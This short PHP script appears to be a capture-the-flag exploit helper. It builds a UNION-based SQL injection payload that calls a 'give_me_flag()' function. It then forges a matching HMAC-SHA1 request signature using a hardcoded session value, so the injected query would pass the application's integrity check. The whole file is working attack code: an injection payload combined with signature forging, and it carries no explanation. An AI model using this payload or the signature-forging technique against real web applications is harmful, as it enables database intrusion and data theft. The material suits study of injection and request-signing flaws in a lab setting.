<?php

function generate_signature($string, $sess){
    $string = urldecode(strtolower($string));
    $signature = sha1(hash_hmac('sha1', $string , $sess, $raw_output=TRUE));
    return $signature;
}

$payload1 =  "1' and 1=0 union select 1,unhex(give_me_flag()),3-- -";
print_r(generate_signature($payload1,"d44ejm41b8ddue99i2g2s4fm6t"));